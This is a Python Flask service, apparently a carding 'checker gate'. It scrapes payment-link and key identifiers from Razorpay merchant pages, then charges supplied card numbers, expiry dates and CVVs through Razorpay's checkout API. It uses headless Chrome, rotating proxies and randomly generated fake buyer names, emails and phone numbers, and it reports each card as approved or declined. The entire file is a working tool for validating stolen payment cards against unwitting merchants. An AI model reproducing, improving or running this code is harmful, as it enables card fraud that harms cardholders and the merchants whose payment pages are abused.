#!/usr/bin/env python3
import os, json
os.environ['PLAYWRIGHT_CHROMIUM_EXECUTABLE_PATH'] = '/usr/bin/google-chrome-stable'
from flask import Flask, request, jsonify
import re, time, random
from urllib.parse import urlparse, parse_qs
from playwright.sync_api import sync_playwright

app = Flask(__name__)
CONTACT = "t.me/sunilxd"

def get_proxy_config(proxy_str):
    if not proxy_str: return None
    p = proxy_str.split(":")
    if len(p) == 4:
        return {"server": f"http://{p[0]}:{p[1]}", "username": p[2], "password": p[3]}
    return {"server": f"http://{p[0]}:{p[1]}"} if len(p) == 2 else None

def get_merchant(site_url, browser):
    try:
        page = browser.new_page()
        page.goto(site_url, timeout=20000)
        page.wait_for_timeout(4000)
        html = page.content()
        page.close()
        pl = re.search(r'"payment_link":\{"id":"(pl_[^"]+)"', html) or re.search(r'"payment_link_id"\s*:\s*"(pl_[^"]+)"', html)
        ppi = re.search(r'"payment_page_items":\[\{"id":"(ppi_[^"]+)"', html) or re.search(r'"payment_page_item_id"\s*:\s*"(ppi_[^"]+)"', html)
        kl = re.search(r'"keyless_header":"(api_v1:[^"]+)"', html)
        kid = re.search(r'"key_id":(null|"rzp_[^"]+")', html)
        # If no payment_link found, try to extract from the page path for pages.razorpay.com
        if not pl and 'pages.razorpay.com' in site_url:
            page_slug = site_url.rstrip('/').split('/')[-1]
            pl_match = re.search(r'"id":"(pl_[^"]+)"', html)
            if pl_match: pl = pl_match
        if kl and (pl or ppi):
            return {
                'pl': pl.group(1) if pl else '',
                'ppi': ppi.group(1) if ppi else '',
                'kl': kl.group(1),
                'kid': kid.group(1).strip('"') if kid and kid.group(1) != 'null' else ''
            }
    except:
        pass
    return None

def check_card(cc, mes, ano, cvv, site_url, amount="5", proxy_str=None):
    start = time.time()
    cn, mes, ano = cc.strip(), mes.zfill(2), ano[-2:] if len(ano) == 4 else ano
    inr = int(float(amount) * 83.50 * 100)
    
    try:
        proxy_cfg = get_proxy_config(proxy_str)
        with sync_playwright() as p:
            browser = p.chromium.launch(channel='chrome', headless=True, proxy=proxy_cfg, args=['--no-sandbox', '--disable-dev-shm-usage'])
            
            merchant = get_merchant(site_url, browser)
            if not merchant:
                browser.close()
                elapsed = time.time() - start
                return {"bin": cn[:6], "card": cn[-4:], "dev": CONTACT, "gate": "Razorpay Charge",
                        "status": "DECLINED", "message": "Not a valid Razorpay site",
                        "time_taken": f"{elapsed:.2f}s", "amount": amount, "site": site_url}
            
            page = browser.new_page()
            page.goto('https://api.razorpay.com/v1/checkout/public?traffic_env=production&new_session=1', timeout=20000)
            page.wait_for_url('**/checkout/public*session_token*', timeout=15000)
            token = parse_qs(urlparse(page.url).query).get('session_token', [None])[0]
            if not token:
                browser.close()
                elapsed = time.time() - start
                return {"bin": cn[:6], "card": cn[-4:], "dev": CONTACT, "gate": "Razorpay Charge",
                        "status": "DECLINED", "message": "Token failed", "time_taken": f"{elapsed:.2f}s", "amount": amount}
            
            u = {"name": f"User{random.randint(100, 999)}", "email": f"test{random.randint(10000, 99999)}@gmail.com",
                 "phone": f"98765{random.randint(10000, 99999)}"}
            
            result_raw = page.evaluate(f"""
            async () => {{
                try {{
                    const r1 = await fetch('https://api.razorpay.com/v1/payment_pages/{merchant['pl']}/order', {{
                        method: 'POST', headers: {{'Content-Type': 'application/json'}},
                        body: JSON.stringify({{notes: {{comment: ''}}, line_items: [{{payment_page_item_id: '{merchant['ppi']}', amount: {inr}}}]}})
                    }});
                    const oid = (await r1.json()).order.id;
                    
                    const d = new URLSearchParams({{
                        'notes[comment]': '', 'payment_link_id': '{merchant['pl']}', 'key_id': '{merchant['kid']}',
                        'callback_url': '{site_url}/callback', 'contact': '+91{u["phone"]}',
                        'email': '{u["email"]}', 'currency': 'INR', '_[library]': 'checkoutjs', '_[platform]': 'browser',
                        'amount': '{inr}', 'order_id': oid, 'method': 'card',
                        'card[number]': '{cn}', 'card[cvv]': '{cvv}', 'card[name]': '{u["name"]}',
                        'card[expiry_month]': '{mes}', 'card[expiry_year]': '{ano}', 'save': '0'
                    }});
                    
                    const r2 = await fetch('https://api.razorpay.com/v1/standard_checkout/payments/create/ajax?key_id={merchant['kid']}&session_token={token}&keyless_header={merchant['kl']}', {{
                        method: 'POST', headers: {{'x-session-token': '{token}', 'Content-Type': 'application/x-www-form-urlencoded'}},
                        body: d.toString()
                    }});
                    return await r2.json();
                }} catch(e) {{
                    return {{_error: e.message || String(e)}};
                }}
            }}
            """)
            
            browser.close()
            elapsed = time.time() - start
            base = {"bin": cn[:6], "card": cn[-4:], "dev": CONTACT, "gate": "Razorpay Charge",
                    "time_taken": f"{elapsed:.2f}s", "amount": amount, "site": site_url}
            
            if isinstance(result_raw, dict):
                pid = result_raw.get('razorpay_payment_id', '') or result_raw.get('payment_id', '')
                err = result_raw.get('error', {})
                js_err = result_raw.get('_error', '')
                
                if pid:
                    if 'otp' in str(result_raw).lower():
                        return {**base, 'status': 'APPROVED', 'message': 'OTP REQUIRED'}
                    return {**base, "status": "APPROVED", "message": "CHARGED"}
                if isinstance(err, dict) and err:
                    raw = err.get('description', '') or err.get('message', '') or str(err)
                    return {**base, "status": "DECLINED", "message": raw[:200]}
                if js_err:
                    return {**base, "status": "DECLINED", "message": js_err[:200]}
                return {**base, "status": "DECLINED", "message": json.dumps(result_raw)[:200]}
            
            return {**base, "status": "DECLINED", "message": str(result_raw)[:200]}
            
    except Exception as e:
        elapsed = time.time() - start
        return {"bin": cn[:6], "card": cn[-4:], "dev": CONTACT, "gate": "Razorpay Charge",
                "status": "DECLINED", "message": str(e)[:200], "time_taken": f"{elapsed:.2f}s", "amount": amount}

@app.route('/razorpay_charge', methods=['GET'])
def charge():
    cc = request.args.get('cc', '')
    url = request.args.get('url', '')
    amt = request.args.get('amt', '5')
    proxy = request.args.get('proxy', '')
    if not cc or not url:
        return jsonify({"status": "DECLINED", "message": "?cc=card|mm|yy|cvv&url=https://razorpay.me/@user&amt=5&proxy=ip:port:user:pass"})
    p = cc.replace('%7C', '|').split('|')
    if len(p) != 4:
        return jsonify({"status": "DECLINED", "message": "Format: cc|mm|yy|cvv"})
    return jsonify(check_card(p[0], p[1], p[2], p[3], url, amt, proxy))

@app.route('/health')
def health():
    return jsonify({"status": "running", "port": 8054, "gate": "Razorpay Charge"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8054, debug=False)
